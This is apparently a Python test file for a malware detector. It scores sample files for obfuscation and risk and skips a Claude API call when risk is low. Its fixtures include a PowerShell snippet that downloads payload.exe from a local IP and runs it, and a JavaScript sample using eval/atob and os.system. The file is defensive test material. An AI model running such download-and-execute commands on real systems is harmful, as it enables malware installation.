# backend/test_local_model.py
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

from preprocessor import preprocess, compress_for_llm
from local_model.obfuscation import detect
from local_model.classifier import _rule_based_fallback
from local_model.risk_scorer import RISK_THRESHOLD_LLM, WEIGHT_CLASSIFIER, WEIGHT_OBFUSCATION

SAMPLES = {
    "benign_hello.py":   b"print('Hello, World!')\nx = 1 + 2\nprint(x)\n",
    "suspicious_ps1.ps1": b"""
$url = 'http://192.168.1.100/payload.exe'
$out = $env:TEMP + '\\update.exe'
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process $out
""",
    "obfuscated_js.js": b"""
eval(atob('dmFyIHggPSAxMjM='));
var aaaaabbbbccccddddeeee = "obfvar";
eval(exec("import os; os.system('whoami')"));
""",
}


def run_test(filename: str, raw: bytes):
    print(f"\n{'='*55}\n파일: {filename}\n{'='*55}")
    prep = preprocess(raw, filename)
    print(f"언어: {prep.lang_hint} | 라인수: {prep.line_count}")
    obf = detect(prep.cleaned_code)
    print(f"\n[난독화] 점수: {obf.score:.3f} | 엔트로피: {obf.entropy:.2f}")
    for t in obf.techniques:
        print(f"  ⚑ {t}")
    clf = _rule_based_fallback(prep.cleaned_code)
    print(f"\n[분류] 신뢰도: {clf.confidence:.3f}")
    for p in clf.patterns_found:
        print(f"  ⚑ {p}")
    final = round(clf.confidence * WEIGHT_CLASSIFIER + obf.score * WEIGHT_OBFUSCATION, 3)
    level = ("critical" if final >= 0.90 else "high" if final >= 0.75
             else "medium" if final >= RISK_THRESHOLD_LLM else "safe")
    print(f"\n[앙상블] {final:.3f} → {level.upper()}")
    if final < RISK_THRESHOLD_LLM:
        print(f"  TOKEN_SAVE: Claude API 호출 SKIP ✓")


if __name__ == "__main__":
    for fname, content in SAMPLES.items():
        run_test(fname, content)
    print(f"\n{'='*55}\n테스트 완료\n{'='*55}")
